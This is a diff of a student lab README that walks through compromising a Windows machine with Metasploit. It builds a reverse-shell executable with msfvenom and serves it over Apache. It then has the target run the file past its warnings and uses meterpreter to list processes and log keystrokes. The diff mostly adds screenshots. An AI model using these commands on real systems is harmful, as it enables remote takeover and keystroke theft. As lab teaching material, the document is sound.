@@ -25,26 +25,33 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
-
-
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
-##OUTPUT
+
+![Screenshot from 2023-05-22 14-48-04](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/197fd273-625d-4d29-8363-24ebb8a85d54)
+
+
 
 
 copy the fun.exe into the apache /var/www/html folder
+![image](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/6b1f530f-289e-4220-bff3-ec89471550c3)
 
 
 Start apache server
-sudo systemctl apache2 start
+sudo systemctl apache2 start and Check the status of apache2
+
+![Screenshot from 2023-05-22 14-50-20](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/69e9dc66-983f-491f-8d4e-650a17b6a8be)
 
 
 
-Check the status of apache2
+
+
 
 
 Invoke msfconsole:
 ## OUTPUT:
+
+![Screenshot from 2023-05-22 14-51-31](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/66454e3a-be70-469d-b3fa-a35ec207dfa2)
 
 
 
@@ -57,15 +64,21 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 exploit
 
+![Screenshot from 2023-05-22 14-52-02](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/52ee054f-56a9-412e-b32a-997b56a7f7a5)
+
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
 
+![Screenshot 2023-05-26 154555](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/a5f7954b-027f-469e-99f2-ff379d6915a8)
+
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 
 On kali give the command exploit
+
+![Screenshot 2023-05-26 154818](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/977882af-8892-4bea-ae73-60a66edcdf65)
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
@@ -89,7 +102,9 @@ keyscan_start	Begins capturing keys typed in the target. On the Windows target, 
 
 
 keyscan_dump	Shows the keystrokes captured so far
-
+```
+![Screenshot 2023-05-26 154955](https://github.com/gokul-sureshkumar/Compromising-windows-using-Metasploit/assets/121148715/e6f8163a-6708-407d-9bd6-ca6992dd3925)
+```
 
 ## RESULT:
 The Metasploit framework for reconnaissance is  examined successfully
